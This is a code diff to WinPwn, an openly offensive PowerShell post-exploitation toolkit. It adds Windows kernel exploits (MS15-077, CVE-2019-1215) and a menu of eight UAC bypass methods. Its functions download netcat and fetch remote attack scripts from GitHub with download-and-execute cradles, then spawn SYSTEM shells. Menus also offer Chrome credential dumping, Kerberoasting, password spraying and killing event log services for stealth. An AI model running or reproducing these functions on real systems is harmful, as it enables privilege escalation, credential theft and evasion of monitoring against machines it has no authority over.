@@ -544,29 +544,33 @@ __        ___       ____
     do
     {
         Write-Host "================ WinPwn ================"
-        Write-Host -ForegroundColor Green '1. MS16-032!'
-        Write-Host -ForegroundColor Green '2. MS16-135! '
-        Write-Host -ForegroundColor Green '3. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
-        Write-Host -ForegroundColor Green '4. CVE-2019-0841 - April 2019!'
-        Write-Host -ForegroundColor Green '5. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
-        Write-Host -ForegroundColor Green '6. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
-        Write-Host -ForegroundColor Green '7. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '8. Exit. '
+ 	Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
+ 	Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
+        Write-Host -ForegroundColor Green '3. MS16-135 - (2016)! '
+        Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
+        Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
+        Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
+        Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
+	Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
+        Write-Host -ForegroundColor Green '9. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '10. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
         Switch ($masterquestion) 
         {
-             1{ms16-32}
-             2{ms16-135}
-             3{CVE-2018-8120}
-             4{CVE-2019-0841}
-             5{cve-2019-1069}
-             6{CVE-2019-1129}
-             7{juicypot}
+	     1{ms15-077}
+             2{ms16-32}
+             3{ms16-135}
+             4{CVE-2018-8120}
+             5{CVE-2019-0841}
+             6{cve-2019-1069}
+             7{CVE-2019-1129}
+	     8{CVE-2019-1215}
+             9{juicypot}
        }
     }
- While ($masterquestion -ne 8)
+ While ($masterquestion -ne 10)
 
 }
 
@@ -578,6 +582,42 @@ function testtemp
  }
 }
 
+function CVE-2019-1215
+{
+    testtemp
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    if ([Environment]::Is64BitProcess)
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2019-1215.ps1')
+    }
+    else
+    {
+        Write-Host "Only x64, Sorry"
+    }
+
+}
+
+function ms15-077
+{
+    testtemp
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    if ([Environment]::Is64BitProcess)
+    {
+        Write-Host "Only x86, Sorry"
+	Start-Sleep -Seconds 3
+    }
+    else
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/m15-077.ps1')
+	MS15-077 -command "C:\temp\nc.exe 127.0.0.1 4444"
+	Start-Sleep -Seconds 3
+	cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
+    }
+    
+
+}
 function juicypot
 {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -602,16 +642,9 @@ function CVE-2018-8120
     testtemp
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    if ([Environment]::Is64BitProcess)
-    {
-        Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/2018-8120.exe" -Outfile C:\temp\exp.exe
-    }
-    else
-    {
-        Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/2018-8120x86.exe" -Outfile C:\temp\exp.exe
-    }
-    C:\temp\exp.exe "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
-    Start-Sleep -Seconds 4
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2018-8120.ps1')
+    cve-2018-8120 -command "C:\temp\nc.exe 127.0.0.1 4444"
+    Start-Sleep -Seconds 3
     cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
 }
 
@@ -965,7 +998,7 @@ function localreconmodules
             $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
+                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
                 Install-SqlLiteAssembly
                 Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
                 Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
@@ -1029,6 +1062,54 @@ __        ___       ____
        }
     }
  While ($masterquestion -ne 9)
+}
+
+function UACBypass
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> UAC Bypass
+
+'@
+    
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. James Forshaw - Environment variables expansion - \system32\svchost.exe via \system32\schtasks.exe!'
+        Write-Host -ForegroundColor Green '2. Oddvar Moe - ICMLuaUtil! '
+        Write-Host -ForegroundColor Green '3. Oddvar Moe derivative - IColorDataProxy, ICMLuaUtil! '
+        Write-Host -ForegroundColor Green '4. Emeric Nasi - Registry key manipulation - \system32\sdclt.exe! '
+        Write-Host -ForegroundColor Green '5. Hashim Jawad - Registry key manipulation - \system32\WSReset.exe!'
+        Write-Host -ForegroundColor Green '6. Clement Rouault - APPINFO command line spoofing - with popUP! '
+        Write-Host -ForegroundColor Green '7. Stefan Kanthak - .NET Code Profiler - with popUP! '
+        Write-Host -ForegroundColor Green '8. winscripting.blog - Registry key manipulation - with popUP -  \system32\fodhelper.exe, \system32\computerdefaults.exe! '
+        Write-Host -ForegroundColor Green '9. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/uacbypass.ps1') 
+        Switch ($masterquestion) 
+        {
+             1{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 34}
+             2{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 41}
+             3{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 43}
+             4{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 53}
+             5{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 56}
+             6{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 38}
+             7{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 39}
+             8{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';UACBypass $command 33}
+       }
+    }
+ While ($masterquestion -ne 9)
+
 }
 
 function passhunt
@@ -2219,15 +2300,16 @@ __        ___       ____
         Write-Host -ForegroundColor Green '3. Domain recon menu! '
         Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
         Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows Kernel Exploits! '
-        Write-Host -ForegroundColor Green '6. Kerberoasting! '
-        Write-Host -ForegroundColor Green '7. Loot local Credentials! '
-        Write-Host -ForegroundColor Green '8. Create an ADIDNS Wildcard! '
-        Write-Host -ForegroundColor Green '9. Sessiongopher! '
-        Write-Host -ForegroundColor Green '10. Kill the event log services for stealth! '
-	    Write-Host -ForegroundColor Green '11. Execute some C# Magic for Creds, Recon and Privesc!'
-	    Write-Host -ForegroundColor Green '12. Load custom C# Binaries from a webserver to Memory and execute them!'
-	    Write-Host -ForegroundColor Green '13. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '14. Exit. '
+	Write-Host -ForegroundColor Green '6. Bypass UAC! '
+        Write-Host -ForegroundColor Green '7. Kerberoasting! '
+        Write-Host -ForegroundColor Green '8. Loot local Credentials! '
+        Write-Host -ForegroundColor Green '9. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '10. Sessiongopher! '
+        Write-Host -ForegroundColor Green '11. Kill the event log services for stealth! '
+	Write-Host -ForegroundColor Green '12. Execute some C# Magic for Creds, Recon and Privesc!'
+	Write-Host -ForegroundColor Green '13. Load custom C# Binaries from a webserver to Memory and execute them!'
+	Write-Host -ForegroundColor Green '14. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '15. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2238,17 +2320,18 @@ __        ___       ____
              3{domainreconmodules}
              4{privescmodules}
              5{kernelexploits}
-             6{kerberoasting}
-             7{kittielocal}
-             8{adidnswildcard}
-             9{sessionGopher}
-            10{inv-phantom}
-            11{sharpcradle -allthosedotnet $true}
-	    12{sharpcradle}
-            13{domainpassspray}
-        }
+	     6{UACBypass}
+             7{kerberoasting}
+             8{kittielocal}
+             9{adidnswildcard}
+             10{sessionGopher}
+            11{inv-phantom}
+            12{sharpcradle -allthosedotnet $true}
+	    13{sharpcradle}
+            14{domainpassspray}
+        
     }
- While ($masterquestion -ne 14)
+ While ($masterquestion -ne 15)
      
     
     #End
